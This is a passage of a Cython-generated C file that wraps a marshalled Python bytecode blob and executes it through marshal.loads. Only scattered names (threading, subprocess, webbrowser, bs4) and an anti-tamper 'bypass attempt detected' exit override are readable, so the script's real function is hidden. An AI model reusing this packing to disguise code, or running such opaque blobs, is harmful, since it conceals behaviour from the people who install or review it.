\\006\\365\\000\\000A\\006G\\006\\364\\000\\000A\\006O\\006\\360\\000\\000P\\006Q\\006\\360\\000\\000S\\006U\\006\\361\\000\\000A\\006V\\006\\364\\000\\000A\\006V\\006\\364\\000\\000S\\004W\\006\\361\\000\\000\\024W\\006\\360\\000\\000Z\\006b\\006\\361\\000\\000\\024b\\006\\360\\000\\000e\\006h\\006\\361\\000\\000\\024h\\006\\360\\000\\000k\\006s\\006\\361\\000\\000\\024s\\006\\360\\000\\000v\\006y\\006\\361\\000\\000\\024y\\006\\360\\000\\000|\\006S\\007\\361\\000\\000\\024S\\007\\365\\000\\000T\\007W\\007\\365\\000\\000X\\007^\\007\\364\\000\\000X\\007f\\007\\360\\000\\000g\\007j\\007\\360\\000\\000k""\\007n\\007\\361\\000\\000X\\007o\\007\\364\\000\\000X\\007o\\007\\361\\000\\000T\\007p\\007\\364\\000\\000T\\007p\\007\\361\\000\\000\\024p\\007\\360\\000\\000q\\007t\\007\\361\\000\\000\\024t\\007\\200j\\335\\013\\023\\220C\\230\\003\\321\\013\\034\\324\\013\\034\\200b\\330\\n\\014\\217'\\212'\\320\\021u\\320\\021u\\325kp\\320qs\\321kt\\324kt\\320\\021u\\321\\021u\\324\\021u\\321\\nu\\324\\nu\\200c\\340\\016\\023\\330\\027'\\330\\0247\\330\\013\\016\\330\\016)\\330\\020\\030\\330\\017?\\330\\022\\034\\330\\032>\\330\\020\\023\\360\\025\\013\\021\\002\\360\\000\\013\\021\\002\\200g\\360\\032\\000\\014\\017\\330\\033(\\330 D\\330\\021\\036\\235s\\2402\\231w\\234w\\321\\021&\\320'B\\321\\021B\\330\\031\\037\\330\\016 \\360\\r\\007\\016\\002\\360\\000\\007\\016\\002\\200d\\365\\022\\000\\022\\032\\224\\035\\320\\037F\\320PW\\320^b\\320\\021c\\321\\021c\\324\\021c\\200h\\330\\021\\031\\227\\035\\222\\035\\221\\037\\224\\037\\327\\021$\\322\\021$\\240V\\250R\\321\\0210\\324\"\"\\0210\\327\\0214\\322\\0214\\260V\\270R\\321\\021@\\324\\021@\\327\\021D\\322\\021D\\300Z\\321\\021P\\324\\021P\\200h\\330\\034$\\237M\\232M\\231O\\234O\\327\\034/\\322\\034/\\260\\006\\270\\002\\321\\034;\\324\\034;\\327\\034?\\322\\034?\\300\\006\\310\\002\\321\\034K\\324\\034K\\205i\\220\\010\\321\\006\\031\\335\\013\\024\\217=\\212=\\230\\030\\240\\\"\\321\\013%\\324\\013%\\200b\\330\\r\\023\\210R\\214V\\320\\024$\\240d\\321\\r+\\324\\r+\\200d\\330\\t\\r\\220\\022\\212\\032\\210\\032\\330\\017\\027\\230&\\321\\017 \\200u\\335\\007\\017\\220\\005\\201\\204\\200\\361C\\001!\\005\\027\\370\\365F\\001\\000\\n\\023\\320\\002\\032\\320\\002\\032\\320\\002\\032\\230\\002\\230\\002\\230\\002\\230\\002\\230\\002\\370\\370\\370\\370\\320\\002\\032\\370\\370\\370\\361S\\001)\\002\\033s\\022\\000\\000\\000\\203I(I+\\000\\311+\\nI?\\003\\311:\\005I?\\003c\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\004\\000\\000\\000\\003\\000\\000\\000\\363\\366\\000\\000\\000\\227\\000t\\001\\000""\\000\\000\\000\\000\\000\\000\\000\\000\\000d\\001\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000D\\000]J}\\000t\\003\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000j\\002\\000\\000\\000\\000\\000\\000\\000\\000t\\006\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\254\\002\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000}\\001|\\001\\240\\004\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\246\\000\\000\\000\\253\\000\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000t\\n\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\240\\006\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000|\\001\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000\\214Kt\\n\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000D\\000]\\026}\\001|\\001\\240\\007\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\246\\000\\000\\000\\253\\000\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000\\214\\027d\\000S\\000)\\003Nr\\363\\000\\000\\000)\\001\\332\\006target)\\010ru\\000\\000\\000\\332\\tthreadingr\\r\\000\\000\\000r\\026\\001\\000\\000\\332\\005start\\332\\007threadsr\\355\\000\\000\\000r;\\000\\000\\000)\\002r2\\000\\000\\000\\332\\001ts\\002\\000\\000\\000  r$\\000\\000\\000\\332\\010printingr\\035\\001\\000\\000\\020\\002\\000\\000st\\000\"\"\\000\\000\\200\\000\\345\\r\\022\\2203\\211Z\\214Z\\360\\000\\003\\005\\032\\360\\000\\003\\005\\032\\210\\001\\335\\014\\025\\324\\014\\034\\245C\\320\\014(\\321\\014(\\324\\014(\\210\\001\\330\\010\\t\\217\\007\\212\\007\\211\\t\\214\\t\\210\\t\\335\\010\\017\\217\\016\\212\\016\\220q\\321\\010\\031\\324\\010\\031\\320\\010\\031\\320\\010\\031\\345\\r\\024\\360\\000\\001\\005\\021\\360\\000\\001\\005\\021\\210\\001\\330\\010\\t\\217\\006\\212\\006\\211\\010\\214\\010\\210\\010\\210\\010\\360\\003\\001\\005\\021\\360\\000\\001""\\005\\021r&\\000\\000\\000c\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\003\\000\\000\\000\\017\\000\\000\\000\\363L\\000\\000\\000\\227\\000t\\001\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000d\\001\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000t\\003\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000j\\002\\000\\000\\000\\000\\000\\000\\000\\000d\\002\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000d\\000S\\000)\\003Nu2\\000\\000\\000\\342\\232\\240\\357\\270\\217 Bypass attempt detected! Script terminated.ro\\000\\000\\000)\\003r\\202\\000\\000\\000r-\\000\\000\\000\\332\\005_exit)\\002\\332\\004args\\332\\006kwargss\\002\\000\\000\\000  r$\\000\\000\\000\\332\\014blocked_exitr\\\"\\001\\000\\000\\\"\\002\\000\\000s\\\"\\000\\000\\000\\200\\000\\335\\004\\t\\320\\n>\\321\\004?\\324\\004?\\320\\004?\\335\\004\\006\\204H\\210Q\\201K\\204K\\200K\\200K\\200Kr&\\000\\000\\000)mr-\\000\\000\\000\\332\\006cfontsr\\002\\000\\000\\000r.\\000\\000\\000ry\\000\\000\\000\\332\\003bs4r\\003\\000\\000\\000r\\242\\000\\000\\000rz\\000\\000\\000r\\033\\000\\000\\000r\\004\\000\\000\\000r\\025\\001\\000\\000r\\005\\000\\000\\000rx\\000\\000\\000\\332\\014rich.consoler\\006\\000\\000\\000\\332\\nrich.panelr\\007\\000\\000\\000r\\031\\001\\000\\000\\332\\nwebbrowserr8\\000\\000\\000r\\340\\000\\000\\000r\\342\\000\\000\\000\\332\\010coloramar\\010\\000\\000\\000r\\t\\000\\000\\000\\332\\nsubprocess\\332\\016importlib.util\\332\\timportlibr\\037\\000\\000\\000r\\n\\000\\000\\000r\\301\\000\\000\\000r\\013\\000\\000\\000rM\\000\\000\\000r\\014\\000\\000\\000rv\\000\\000\\000\\332\\006stringr\\r\\000\\000\\000r\\017\\000\\000\\000r\\020\\000\\000\\000r\\021\\000\\000\\000\\332\\002c1\\332\\003j21\\332\\002p1r?\\000\\000\\000r\\026\\000\\000\\000r\\364\\000\\000\\000\\332\\006BWhiter\\\"\\000\\000\\000r=\\000\\000\"\"\\000r9\\000\\000\\000\\332\\004demo\\332\\002bi\\332\\004ror1\\332\\004memo\\332""\\003rorr@\\000\\000\\000\\332\\006yellow\\332\\004blue\\332\\007magenta\\332\\001Mr<\\000\\000\\000\\332\\006orange\\332\\005resetr>\\000\\000\\000\\332\\001Z\\332\\002Y6\\332\\002G6\\332\\004red6\\332\\002P6\\332\\003DP6\\332\\002W6\\332\\003DY6\\332\\002O6\\332\\002L6\\332\\002s6r\\030\\000\\000\\000r1\\000\\000\\000r,\\000\\000\\000r2\\000\\000\\000r\\202\\000\\000\\000r\\272\\000\\000\\000rA\\000\\000\\000rB\\000\\000\\000rC\\000\\000\\000rD\\000\\000\\000rE\\000\\000\\000rF\\000\\000\\000\\332\\005inputr\\274\\000\\000\\000r\\273\\000\\000\\000rH\\000\\000\\000rN\\000\\000\\000r\\203\\000\\000\\000r\\245\\000\\000\\000r\\255\\000\\000\\000r\\310\\000\\000\\000r\\322\\000\\000\\000r\\327\\000\\000\\000r\\352\\000\\000\\000r\\271\\000\\000\\000r\\354\\000\\000\\000r\\356\\000\\000\\000r\\026\\001\\000\\000r\\033\\001\\000\\000r\\035\\001\\000\\000\\332\\004exit\\332\\roriginal_exitr\\\"\\001\\000\\000r*\\000\\000\\000r&\\000\\000\\000r$\\000\\000\\000\\372\\010<module>rJ\\001\\000\\000\\001\\000\\000\\000s\\310\\010\\000\\000\\360\\003\\001\\001\\001\\340\\000\\t\\200\\t\\200\\t\\200\\t\\330\\004\\021\\200M\\200M\\200M\\320\\022+\\320\\022+\\320\\022+\\320\\022+\\320\\022+\\320\\022+\\320\\022+\\370\\330\\000-\\200y\\200r\\204y\\320\\021,\\321\\007-\\324\\007-\\320\\007-\\320\\007-\\320\\007-\\370\\370\\370\\330\\004\\023\\200O\\200O\\200O\\200O\\370\\330\\000(\\200y\\200r\\204y\\320\\021'\\321\\007(\\324\\007(\\320\\007(\\320\\007(\\320\\007(\\370\\370\\370\\330\\004!\\320\\004!\\320\\004!\\320\\004!\\320\\004!\\320\\004!\\320\\004!\\370\\330\\000#\\200y\\200r\\204y\\320\\021\\\"\\321\\007#\\324\\007#\\320\\007#\\320\\007#\\320\\007#\\370\\370\\370\\330\\004\\031\\320\\004\\031\\320\\004\\031\\320\\004\\031\\320\\004\\031\\320\\004\\031\\320\\004\\031\\320\\004\\031\\320\\004\\031\\320\\004\\031\\320\\004\\031\\320\\004\\031\\320\\004\\031\\320\\004\\031\\320\\004\\031\\320\\004\\031\\320\\004\\031\\370\\330\\000$\\200y\\200r\\204y\\320\\021#\\321\\007$\\324""\\007$\\320\\007$\\320\\007$\\320\\007$\\370\\370\\370\\330\\004!\\320\\004!\\320\\004!\\320\\004!\\320\\004!\\320\\004!\\320\\004!\\370\\330\\000\\\"\\200y\\200r\\204y\\320\\021!\\321\\007\\\"\\324\\007\\\"\\320\\007\\\"\\320\\007\\\"\\320\\007\\\"\\370\\370\\370\\330\\004.\\320\\004.\\320\\004.\\320\\004.\\320\\004.\\320\\004.\\320\\004.\\370\\330\\000*\\200y\\200r\\204y\"\"\\320\\021)\\321\\007*\\324\\007*\\320\\007*\\320\\007*\\320\\007*\\370\\370\\370\\330\\0045\\320\\0045\\320\\0045\\320\\0045\\320\\0045\\320\\0045\\320\\0045\\370\\330\\000$\\200y\\200r\\204y\\320\\021#\\321\\007$\\324\\007$\\320\\007$\\320\\007$\\320\\007$\\370\\370\\370\\330\\004$\\320\\004$\\320\\004$\\320\\004$\\320\\004$\\320\\004$\\320\\004$\\370\\330\\000$\\200y\\200r\\204y\\320\\021#\\321\\007$\\324\\007$\\320\\007$\\320\\007$\\320\\007$\\370\\370\\370\\330\\004 \\320\\004 \\320\\004 \\320\\004 \\320\\004 \\320\\004 \\320\\004 \\370\\330\\000)\\200y\\200r\\204y\\320\\021(\\321\\007)\\324\\007)\\320\\007)\\320\\007)\\320\\007)\\370\\370\\370\\330\\004\\037\\320\\004\\037\\320\\004\\037\\320\\004\\037\\320\\004\\037\\320\\004\\037\\320\\004\\037\\320\\004\\037\\320\\004\\037\\370\\330\\000&\\200y\\200r\\204y\\320\\021%\\321\\007&\\324\\007&\\320\\007&\\320\\007&\\320\\007&\\370\\370\\370\\330\\004\\021\\200M\\200M\\200M\\200M\\370\\330\\000'\\200y\\200r\\204y\\320\\021&\\321\\007'\\324\\007'\\320\\007'\\320\\007'\\320\\007'\\370\\370\\370\\330\\004\\022\\200N\\200N\\200N\\200N\\370\\330\\000$\\200y\\200r\\204y\\320\\021#\\321\\007$\\324\\007$\\320\\007$\\320\\007$\\320\\007$\\370\\370\\370\\330\\004\\017\\200K\\200K\\200K\\200K\\370\\330\\000$\\200y\\200r\\204y\\320\\021#\\321\\007$\\324\\007$\\320\\007$\\320\\007$\\320\\007$\\370\\370\\370\\330\\004$\\320\\004$\\320\\004$\\320\\004$\\320\\004$\\320\\004$\\320\\004$\\320\\004$\\320\\004$\\370\\330\\000(\\200y\\200r\\204y\\320\\021'\\321\\007(\\324\\007(\\320\\007(\\320\\007(\\320\\007(\\370\\370\\370\\330\\000\\n\\200\\n\\200\\n\\200""\\n\\330\\0000\\320\\0000\\320\\0000\\320\\0000\\320\\0000\\320\\0000\\320\\0000\\320\\0000\\320\\0000\\320\\0000\\320\\0000\\320\\0000\\320\\0000\\320\\0000\\320\\0000\\320\\0000\\320\\0000\\320\\0000\\320\\0000\\320\\0000\\330\\000\\037\\320\\000\\037\\320\\000\\037\\320\\000\\037\\320\\000\\037\\320\\000\\037\\330\\000\\037\\320\\000\\037\\320\\000\\037\\320\\000\\037\\320\\000\\037\\320\\000\\037\\330\\000\\\"\\320\\000\\\"\\320\\000\\\"\\320\\000\\\"\\320\\000\\\"\\320\\000\\\"\\330\\000\\013\\200\\013\\200\\013\\200\\013\\340\\000\\021\\320\\000\\021\\320\\000\\021\\320\\000\\021\\330\\000\\017\\200\\017\\200\\017\\200\\017\\330\\000\\r\\200\\r\\200\\r\\200\\r\\330\\000\\023\\320\\000\\023\\320\\000\\023\\320\\000\\023\\320\\000\\023\\320\\000\\023\\320\\000\\023\\320\\000\\023\\330\\000\\034\\320\\000\\034\\320\\000\\034\\320\\000\\034\"\"\\320\\000\\034\\320\\000\\034\\330\\000\\t\\200\\t\\200\\t\\200\\t\\330\\000\\030\\320\\000\\030\\320\\000\\030\\320\\000\\030\\330\\000\\037\\320\\000\\037\\320\\000\\037\\320\\000\\037\\320\\000\\037\\320\\000\\037\\330\\0001\\320\\0001\\320\\0001\\320\\0001\\320\\0001\\320\\0001\\330\\000\\037\\320\\000\\037\\320\\000\\037\\320\\000\\037\\320\\000\\037\\320\\000\\037\\330\\000\\\"\\320\\000\\\"\\320\\000\\\"\\320\\000\\\"\\320\\000\\\"\\320\\000\\\"\\330\\000\\t\\200\\t\\200\\t\\200\\t\\330\\000\\016\\200\\016\\200\\016\\200\\016\\330\\000\\013\\200\\013\\200\\013\\200\\013\\330\\000\\030\\320\\000\\030\\320\\000\\030\\320\\000\\030\\320\\000\\030\\320\\000\\030\\330\\000\\n\\200\\n\\200\\n\\200\\n\\330\\000\\031\\320\\000\\031\\320\\000\\031\\320\\000\\031\\320\\000\\031\\320\\000\\031\\330\\000\\017\\200\\017\\200\\017\\200\\017\\360\\002\\004\\001(\\330\\001'\\320\\001'\\320\\001'\\320\\001'\\320\\001'\\320\\001'\\320\\001'\\320\\001'\\320\\001'\\320\\001'\\320\\001'\\370\\360\\002\\002\\001(\\330\\001\\n\\200\\022\\204\\031\\320\\013!\\321\\001\\\"\\324\\001\\\"\\320\\001\\\"\\330\\001'\\320\\001'\\320\\001'\\320""\\001'\\320\\001'\\320\\001'\\320\\001'\\320\\001'\\320\\001'\\320\\001'\\320\\001'\\320\\001'\\370\\370\\370\\360\\002\\004\\001#\\330\\004\\\"\\320\\004\\\"\\320\\004\\\"\\320\\004\\\"\\320\\004\\\"\\320\\004\\\"\\320\\004\\\"\\320\\004\\\"\\320\\004\\\"\\370\\360\\002\\002\\001#\\330\\004\\r\\200B\\204I\\320\\016)\\321\\004*\\324\\004*\\320\\004*\\330\\004\\\"\\320\\004\\\"\\320\\004\\\"\\320\\004\\\"\\320\\004\\\"\\320\\004\\\"\\320\\004\\\"\\320\\004\\\"\\320\\004\\\"\\320\\004\\\"\\370\\370\\370\\330\\000\\013\\200\\013\\200\\013\\200\\013\\330\\005\\025\\200\\002\\330\\006\\026\\200\\003\\330\\005\\025\\200\\002\\330\\007\\030\\200\\004\\330\\004\\024\\200\\001\\330\\004\\020\\200\\001\\330\\t\\025\\200\\006\\330\\004\\020\\200\\001\\330\\010\\031\\200\\005\\330\\007\\025\\200v\\204~\\220c\\2303\\321\\007\\037\\324\\007\\037\\200\\004\\330\\005\\023\\200V\\204^\\220A\\220c\\321\\005\\032\\324\\005\\032\\200\\002\\330\\007\\033\\220D\\320\\007\\033\\320\\007\\033\\320\\007\\033\\200\\004\\330\\007\\025\\200v\\204~\\220c\\2303\\321\\007\\037\\324\\007\\037\\200\\004\\330\\006\\032\\2204\\320\\006\\032\\320\\006\\032\\320\\006\\032\\200\\003\\340\\006\\027\\200\\003\\330\\010\\031\\200\\005\\330\\t\\032\\200\\006\\330\\007\\030\\200\\004\\330\\007\\030\\200\\004\\330\\n\\033\\200\\007\\330\\004\\025\\200\\001\\330\\010\\031\\200\\005\\330\\t \\200\\006\\330\\010\\021\\200\"\"\\005\\330\\003\\017\\200\\002\\330\\002\\016\\200\\001\\330\\003\\017\\200\\002\\330\\003\\017\\200\\002\\330\\005\\021\\200\\004\\330\\003\\017\\200\\002\\330\\004\\020\\200\\003\\330\\003\\017\\200\\002\\330\\004\\024\\200\\003\\330\\003\\023\\200\\002\\330\\004\\024\\200\\002\\330\\004\\n\\200F\\210B\\210q\\220\\022\\220D\\230\\022\\230B\\230r\\320\\013\\\"\\321\\004#\\324\\004#\\200\\002\\340\\006\\022\\200\\003\\330\\000\\022\\320\\000\\022\\320\\000\\022\\320\\000\\022\\320\\000\\022\\320\\000\\022\\320\\000\\022\\320\\000\\022\\320\\000\\022\\320\\000\\022\\320\\000\\022\\320\\000""\\022\\360\\002\\005\\001 \\360\\000\\005\\001 \\360\\000\\005\\001 \\360\\000\\005\\001 \\360\\000\\005\\001 \\361\\000\\005\\001 \\364\\000\\005\\001 \\360\\000\\005\\001 \\360\\020\\000\\007\\t\\360\\000\\030\\nx\\002\\361\\000\\030\\007x\\002\\200\\004\\3602\\001\\001\\027\\360\\000\\001\\001\\027\\360\\000\\001\\001\\027\\360\\004\\001\\001\\016\\360\\000\\001\\001\\016\\360\\000\\001\\001\\016\\340\\000\\001\\200\\001\\201\\003\\204\\003\\200\\003\\340\\000\\005\\200\\005\\200b\\360\\000\\000\\013x\\002\\361\\000\\000\\007x\\002\\361\\000\\000\\001y\\002\\364\\000\\000\\001y\\002\\360\\000\\000\\001y\\002\\330\\000\\005\\200\\005\\210\\025\\320\\006{\\320\\006{\\320\\006{\\321\\000|\\324\\000|\\320\\000|\\330\\000\\005\\200\\005\\200b\\360\\000\\000\\013y\\002\\361\\000\\000\\007y\\002\\361\\000\\000\\001z\\002\\364\\000\\000\\001z\\002\\360\\000\\000\\001z\\002\\340\\010\\t\\200\\005\\330\\007\\010\\200\\004\\330\\013\\014\\200\\010\\330\\013\\014\\200\\010\\330\\t\\n\\200\\006\\330\\004\\022\\200F\\204N\\2201\\220S\\321\\004\\031\\324\\004\\031\\200\\001\\330\\005\\026\\220!\\320\\005\\026\\320\\005\\026\\320\\005\\026\\200\\002\\330\\006\\013\\200e\\210I\\321\\006\\026\\324\\006\\026\\200\\005\\340\\000\\t\\200\\t\\200\\t\\200\\t\\330\\000\\017\\200\\017\\200\\017\\200\\017\\330\\003\\010\\2005\\210\\035\\321\\003\\027\\324\\003\\027\\200\\002\\360\\006\\017\\001\\027\\360\\000\\017\\001\\027\\360\\000\\017\\001\\027\\360 \\000\\006\\\"\\200\\002\\360\\002.\\001\\016\\360\\000.\\001\\016\\360\\000.\\001\\016\\360^\\001\\000\\001\\004\\200\\003\\201\\005\\204\\005\\200\\005\\360\\004\\037\\001\\013\\360\\000\\037\\001\\013\\360\\000\\037\\001\\013\\360B\\001\\032\\001\\026\\360\\000\\032\\001\\026\\360\\000\\032\\001\\026\\3608T\\001\\001\\027\\360\\000T\\001\\001\\027\\360\\000T\\001\\001\\027\\360l\\0022\\001\\016\\360\\0002\\001\\016\\360\\0002\\001\\016\"\"\\360j\\001\\006\\001\\033\\360\\000\\006\\001\\033\\360\\000\\006\\001\\033\\360\\020\\037\\001""\\017\\360\\000\\037\\001\\017\\360\\000\\037\\001\\017\\360F\\001\\000\\r\\017\\200\\t\\330\\004\\006\\200\\003\\360\\002\\006\\001\\026\\360\\000\\006\\001\\026\\360\\000\\006\\001\\026\\360\\016*\\001\\033\\360\\000*\\001\\033\\360\\000*\\001\\033\\360Z\\001\\000\\013\\r\\200\\007\\360\\002\\010\\001\\021\\360\\000\\010\\001\\021\\360\\000\\010\\001\\021\\360\\022\\000\\001\\t\\200\\010\\201\\n\\204\\n\\200\\n\\340\\000\\t\\200\\t\\200\\t\\200\\t\\330\\000\\n\\200\\n\\200\\n\\200\\n\\330\\000\\035\\320\\000\\035\\320\\000\\035\\320\\000\\035\\320\\000\\035\\320\\000\\035\\360\\006\\000\\021\\024\\224\\010\\200\\r\\360\\004\\002\\001\\020\\360\\000\\002\\001\\020\\360\\000\\002\\001\\020\\360\\010\\000\\014\\030\\200\\003\\204\\010\\200\\010\\200\\010s\\271\\000\\000\\000\\205\\n\\020\\000\\220\\022$\\003\\247\\004,\\000\\254\\022A\\000\\003\\301\\003\\006A\\n\\000\\301\\n\\022A\\036\\003\\301!\\020A2\\000\\3012\\022B\\006\\003\\302\\t\\006B\\020\\000\\302\\020\\022B$\\003\\302'\\006B.\\000\\302.\\022C\\002\\003\\303\\005\\006C\\014\\000\\303\\014\\022C \\003\\303#\\006C*\\000\\303*\\022C>\\003\\304\\001\\006D\\010\\000\\304\\010\\022D\\034\\003\\304\\037\\010D(\\000\\304(\\022D<\\003\\304?\\004E\\004\\000\\305\\004\\022E\\030\\003\\305\\033\\004E \\000\\305 \\022E4\\003\\3057\\004E<\\000\\305<\\022F\\020\\003\\306\\023\\010F\\034\\000\\306\\034\\022F0\\003\\310<\\nI\\007\\000\\311\\007\\034I%\\003\\311)\\010I2\\000\\3112\\032J\\016\\003\";\nstatic PyObject *__pyx_n_s_builtins;\nstatic PyObject *__pyx_kp_b_c_2_d_d_l_Z_d_d_l_Z_d_d_l_m_Z_n;\nstatic PyObject *__pyx_n_s_cline_in_traceback;\nstatic PyObject *__pyx_n_s_import;\nstatic PyObject *__pyx_n_s_loads;\nstatic PyObject *__pyx_n_s_main;\nstatic PyObject *__pyx_n_s_marshal;\nstatic PyObject *__pyx_n_s_name;\nstatic PyObject *__pyx_n_s_test;\nstatic PyObject *__pyx_tuple_;\n/* Late includes */\n\nstatic PyMethodDef __pyx_methods[] = {\n  {0, 0, 0, 0}\n};\n\n#if PY_MAJOR_VERSION >= 3\n#if CYTHON_PEP489_MULTI_PHASE_""INIT\nstatic PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/\nstatic int __pyx_pymod_exec_source(PyObject* module); /*proto*/\nstatic PyModuleDef_Slot __pyx_moduledef_slots[] = {\n  {Py_mod_create, (void*)__pyx_pymod_create},\n  {Py_mod_exec, (void*)__pyx_pymod_exec_source},\n  {0, NULL}\n};\n#endif\n\nstatic struct PyModuleDef __pyx_moduledef = {\n    PyModuleDef_HEAD_INIT,\n    \"source\",\n    0, /* m_doc */\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n    0, /* m_size */\n  #else\n    -1, /* m_size */\n  #endif\n    __pyx_methods /* m_methods */,\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n    __pyx_moduledef_slots, /* m_slots */\n  #else\n    NULL, /* m_reload */\n  #endif\n    NULL, /* m_traverse */\n    NULL, /* m_clear */\n    NULL /* m_free */\n};\n#endif\n#ifndef CYTHON_SMALL_CODE\n#if defined(__clang__)\n    #define CYTHON_SMALL_CODE\n#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))\n    #define CYTHON_SMALL_CODE __attribute__((cold))\n#else\n    #define CYTHON_SMALL_CODE\n#endif\n#endif\n\nstatic __Pyx_StringTabEntry __pyx_string_tab[] = {\n  {&__pyx_n_s_builtins, __pyx_k_builtins, sizeof(__pyx_k_builtins), 0, 0, 1, 1},\n  {&__pyx_kp_b_c_2_d_d_l_Z_d_d_l_Z_d_d_l_m_Z_n, __pyx_k_c_2_d_d_l_Z_d_d_l_Z_d_d_l_m_Z_n, sizeof(__pyx_k_c_2_d_d_l_Z_d_d_l_Z_d_d_l_m_Z_n), 0, 0, 0, 0},\n  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},\n  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},\n  {&__pyx_n_s_loads, __pyx_k_loads, sizeof(__pyx_k_loads), 0, 0, 1, 1},\n  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},\n  {&__pyx_n_s_marshal, __pyx_k_marshal, sizeof(__pyx_k_marshal), 0, 0, 1, 1},\n  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},\n  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},\n  {0, 0, 0, 0, 0, 0, 0}\n};\nstatic CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {\n  ret""urn 0;\n}\n\nstatic CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_InitCachedConstants\", 0);\n\n  \n  __pyx_tuple_ = PyTuple_Pack(1, __pyx_kp_b_c_2_d_d_l_Z_d_d_l_Z_d_d_l_m_Z_n); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 7, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_tuple_);\n  __Pyx_GIVEREF(__pyx_tuple_);\n  __Pyx_RefNannyFinishContext();\n  return 0;\n  __pyx_L1_error:;\n  __Pyx_RefNannyFinishContext();\n  return -1;\n}\n\nstatic CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {\n  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 4, __pyx_L1_error)\n  return 0;\n  __pyx_L1_error:;\n  return -1;\n}\n\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/\n\nstatic int __Pyx_modinit_global_init_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_global_init_code\", 0);\n  /*--- Global init code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_variable_export_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_variable_export_code\", 0);\n  /*--- Variable export code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_function_export_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_function_export_code\", 0);\n  /*--- Function export code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_mod""init_type_init_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_type_init_code\", 0);\n  /*--- Type init code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_type_import_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_type_import_code\", 0);\n  /*--- Type import code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_variable_import_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_variable_import_code\", 0);\n  /*--- Variable import code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_function_import_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext(\"__Pyx_modinit_function_import_code\", 0);\n  /*--- Function import code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\n\n#ifndef CYTHON_NO_PYINIT_EXPORT\n#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC\n#elif PY_MAJOR_VERSION < 3\n#ifdef __cplusplus\n#define __Pyx_PyMODINIT_FUNC extern \"C\" void\n#else\n#define __Pyx_PyMODINIT_FUNC void\n#endif\n#else\n#ifdef __cplusplus\n#define __Pyx_PyMODINIT_FUNC extern \"C\" PyObject *\n#else\n#define __Pyx_PyMODINIT_FUNC PyObject *\n#endif\n#endif\n\n\n#if 